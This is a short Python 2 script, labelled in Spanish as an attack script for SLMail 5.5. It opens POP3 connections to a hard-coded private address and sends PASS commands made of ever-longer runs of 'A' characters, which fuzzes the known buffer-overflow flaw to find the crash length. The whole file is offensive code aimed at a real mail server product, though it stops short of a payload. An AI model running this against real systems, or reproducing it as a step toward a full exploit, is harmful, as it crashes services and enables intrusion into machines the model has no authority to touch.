#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket


logo = """\n
	Script attack slmail 5.5
	Autor: Yonatan_Correa

	twitter: @Yonatan_correa
	Blog: https://risataim.blogspot.com

"""

host = "192.168.0.16"
print logo 

buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing PASS con %s bytes" % len(string)
	conexion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conexion.connect((host,110))
	conexion.recv(1024)
	conexion.send('USER anonymous\r\n')
	conexion.recv(1024)	
	conexion.send('PASS ' + string + '\r\n')
	conexion.send('QUIT\r\n')
	conexion.close()
